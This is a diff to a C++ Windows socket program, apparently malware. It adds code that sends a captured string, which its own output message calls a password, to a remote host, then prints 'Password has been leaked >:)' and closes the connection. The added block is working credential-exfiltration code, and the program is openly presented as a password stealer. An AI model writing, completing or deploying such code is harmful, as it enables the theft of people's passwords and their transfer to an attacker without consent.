@@ -134,7 +134,9 @@ int main() {
     first_unit->ai_protocol);
 
     result = connect(TargetSocket, first_unit->ai_addr, (int)first_unit->ai_addrlen);
+
     if (result == SOCKET_ERROR) {
+
         while (first_unit != nullptr && result == SOCKET_ERROR) {
             first_unit = first_unit->ai_next;
             result = connect(TargetSocket, first_unit->ai_addr, (int)first_unit->ai_addrlen);
@@ -153,6 +155,31 @@ int main() {
         WSACleanup();
         return 1;
     }
+
+    int buflen = ind;
+    const char* data = Word.c_str();
+
+    result = send(TargetSocket, data, buflen, 0);
+
+    if (result == SOCKET_ERROR) {
+        cout << "send failed: " << WSAGetLastError() << endl;
+        closesocket(TargetSocket);
+        WSACleanup();
+        return 1;
+    }
+
+    cout << "Password has been leaked >:)" << endl;
+
+    result = shutdown(TargetSocket, SD_SEND);
+    if (result == SOCKET_ERROR) {
+        cout << "shutdown failed: " << WSAGetLastError() << endl;
+        closesocket(TargetSocket);
+        WSACleanup();
+        return 1;
+    }
+
+    closesocket(TargetSocket);
+    WSACleanup();
 
     return 0;
 }
